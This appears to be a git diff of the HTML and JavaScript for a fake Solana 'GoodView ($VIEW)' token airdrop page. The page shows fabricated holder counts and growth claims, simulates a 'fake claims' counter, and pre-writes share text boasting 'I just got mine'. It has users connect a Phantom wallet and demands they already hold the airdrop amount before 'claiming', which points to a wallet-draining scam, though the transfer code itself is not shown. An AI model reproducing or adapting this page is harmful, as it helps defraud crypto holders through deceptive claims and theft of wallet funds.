@@ -8,13 +8,13 @@
     <meta name="description" content="GoodView ($VIEW) - Community-driven meme coin on Solana. Claim 10 USD in Solana airdrop now.">
     <meta property="og:title" content="GoodView Airdrop: Claim 10 USD in Solana (~0.0588 SOL)">
     <meta property="og:description" content="Join 12,000+ holders. 100% fair launch. LP burned. Claim your 10 USD in Solana airdrop before 5,000 slots run out!">
-    <meta property="og:image" content="https://images.pump.fun/coin-image/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=512x512&ipfs=bafkreiahu76sszvo2j2hfqe2tyy7a2bwu7tcem32tmlubwsyvtvfbezwxu">
+    <meta property="og:image" content="https://images.pump.fun/coin-banner/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=1500x500&ipfs=QmamXAh7YTXn2s3uDYPp2HGn1S5yi7yfPSfmKhtKnfCz2e&src=https%3A%2F%2Fipfs.io%2Fipfs%2FQmamXAh7YTXn2s3uDYPp2HGn1S5yi7yfPSfmKhtKnfCz2e">
     <meta property="og:url" content="https://yourdomain.com">
     <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://images.pump.fun/coin-banner/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=1500x500&ipfs=QmamXAh7YTXn2s3uDYPp2HGn1S5yi7yfPSfmKhtKnfCz2e&src=https%3A%2F%2Fipfs.io%2Fipfs%2FQmamXAh7YTXn2s3uDYPp2HGn1S5yi7yfPSfmKhtKnfCz2e">
     <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://images.pump.fun/coin-image/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=86x86&ipfs=bafkreiahu76sszvo2j2hfqe2tyy7a2bwu7tcem32tmlubwsyvtvfbezwxu" type="image/png">
     <style>
-        /* Matrix Rain - White */
         canvas#matrix {
             position: fixed;
             top: 0; left: 0;
@@ -119,7 +119,6 @@
     <h1>GOODVIEW</h1>
     <p class="subtitle">MINT: AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump | Solana Meme Coin</p>
 
-    <!-- LONG DESCRIPTION -->
     <div class="long-desc">
         <p><strong class="highlight">GoodView ($VIEW)</strong> is a <strong>100% community-owned</strong> meme coin launched on <strong>pump.fun</strong> with <strong>no presale, no team allocation</strong>, and <strong>liquidity pool burned</strong> at launch.</p>
         <p>With <strong>over 12,000 holders</strong> and growing 300% daily, $VIEW is rapidly becoming the <strong>next 1000x gem</strong> on Solana. Our mission is simple: <strong>fun, transparency, and moonshots</strong>.</p>
@@ -155,7 +154,6 @@ GOODVIEW COMMAND INTERFACE
 
     <button id="connect-wallet" class="btn">CONNECT PHANTOM WALLET</button>
 
-    <!-- SOCIAL SHARE BUTTONS -->
     <div class="social-share">
         <a href="#" class="social-btn" id="share-x"><img src="https://api.iconify.design/mdi:twitter.svg?color=white" alt="X"> X</a>
         <a href="#" class="social-btn" id="share-tg"><img src="https://api.iconify.design/mdi:telegram.svg?color=white" alt="TG"> Telegram</a>
@@ -187,7 +185,6 @@ GOODVIEW COMMAND INTERFACE
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 
-<!-- Matrix Rain -->
 <script>
     const canvas = document.getElementById('matrix');
     const ctx = canvas.getContext('2d');
@@ -210,7 +207,6 @@ GOODVIEW COMMAND INTERFACE
 
 <audio id="claimSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-level-up-2065.mp3" preload="auto"></audio>
 
-<!-- FULL LOGIC -->
 <script>
 $(document).ready(function() {
     const output = $('#output'), status = $('#status'), connectBtn = $('#connect-wallet');
@@ -218,9 +214,8 @@ $(document).ready(function() {
     const MINT = 'AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump';
     const TOTAL = 5000; let claimed = parseInt(localStorage.getItem('gv_claimed') || '127');
     let connected = false, claiming = false;
-    let solPrice = 170; // Default, fetched below
+    let solPrice = 170; 
 
-    // Fetch real SOL price
     async function fetchSolPrice() {
         try {
             const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
@@ -255,7 +250,6 @@ $(document).ready(function() {
         setTimeout(updatePrice, 30000);
     }
 
-    // Fake claims
     setInterval(() => {
         if (claimed < TOTAL && Math.random() > 0.98) {
             claimed++; localStorage.setItem('gv_claimed', claimed); updateCountdown();
@@ -263,7 +257,6 @@ $(document).ready(function() {
         }
     }, 3500);
 
-    // Social Share
     const url = encodeURIComponent(window.location.href);
     const text = encodeURIComponent("Claim FREE 10 USD in Solana on GoodView Airdrop! Only 5,000 spots left! I just got mine.");
     $('#share-x').attr('href', `https://x.com/intent/post?text=${text}&url=${url}`);
@@ -271,7 +264,6 @@ $(document).ready(function() {
     $('#share-discord').attr('href', `https://discord.com/channels/@me?content=${text}%20${url}`);
     $('#share-reddit').attr('href', `https://reddit.com/submit?title=${text}&url=${url}`);
 
-    // Command Input
     $('#command-input').on('keydown', e => {
         if (e.key === 'Enter') {
             const cmd = e.target.value.trim().toUpperCase();
@@ -287,7 +279,6 @@ $(document).ready(function() {
         }
     });
 
-    // Wallet Logic
     connectBtn.on('click', async () => {
         if (claiming) return;
         if (window.solana && window.solana.isPhantom) {
@@ -301,10 +292,8 @@ $(document).ready(function() {
                 const min = await conn.getMinimumBalanceForRentExemption(0);
                 const airdropLamports = Math.floor((10 / solPrice) * 1e9);
                 if (balance < airdropLamports + min) { alert("Insufficient funds for airdrop."); return; }
-
                 connectBtn.text("CLAIM 10 USD IN SOLANA").removeClass('btn').addClass('btn success');
                 status.text('STATUS: CONNECTED | AIRDROP: READY');
-
                 connectBtn.off('click').on('click', async () => {
                     if (claiming) return; claiming = true;
                     log('Claiming 10 USD in Solana...');
@@ -333,8 +322,6 @@ $(document).ready(function() {
             alert("Phantom not found."); window.open("https://phantom.app", "_blank");
         }
     });
-
-    // Init
     log('GoodView Terminal v3.0 Online.');
     updatePrice();
     setInterval(() => log('Blockchain sync: 100%'), 9000);
